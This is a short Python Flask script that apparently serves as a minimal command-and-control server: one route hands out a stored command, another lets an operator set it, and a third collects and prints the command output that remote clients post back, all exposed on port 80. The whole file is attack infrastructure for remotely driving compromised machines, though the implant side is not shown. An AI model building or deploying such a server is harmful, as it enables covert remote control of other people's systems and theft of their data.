from flask import Flask, request

app = Flask(__name__)

current_command = ""

@app.route('/command', methods=['GET'])
def get_command():
    """ print current command """
    global current_command
    return current_command

@app.route('/result', methods=['POST'])
def post_result():
    """ print command output """
    output = request.form.get("output", "")
    print(f"COMMAND OUTPUT:\n{output}")
    return "OK"

@app.route('/set_command', methods=['POST'])
def set_command():
    """ set new command """
    global current_command
    command = request.form.get("command", "")
    if command:
        current_command = command
        print(f"New command: {command}")
        return 200
    else:
        return "Error!\n", 400

if __name__ == "__main__":
    print("Server started on port 80...")
    app.run(host="0.0.0.0", port=80)